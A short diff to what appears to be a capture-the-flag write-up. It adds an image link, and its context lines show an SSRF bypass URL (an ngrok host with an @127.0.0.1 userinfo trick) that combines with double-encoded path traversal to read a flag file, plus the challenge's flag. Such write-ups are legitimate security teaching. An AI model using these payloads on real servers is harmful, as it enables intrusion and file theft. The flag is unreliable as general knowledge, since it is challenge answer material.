@@ -155,6 +155,8 @@ google.com@127.0.0.1
 http://6.tcp.eu.ngrok.io:16967@127.0.0.1/admin/view_file?file=%252E%252E%252F%252E%252E%252Fvar%252Fflag%252Fflag.txt
 ```
 
+![image](https://github.com/user-attachments/assets/f350904e-2542-483a-a1cd-3e2a62828feb)
+
 - Flag-: ```BMCTF{LOCALHOST_isnt_ALWAYS_local}```
 
 ![image](https://github.com/user-attachments/assets/ed515136-f3a7-4b78-be08-cd59b97700af)
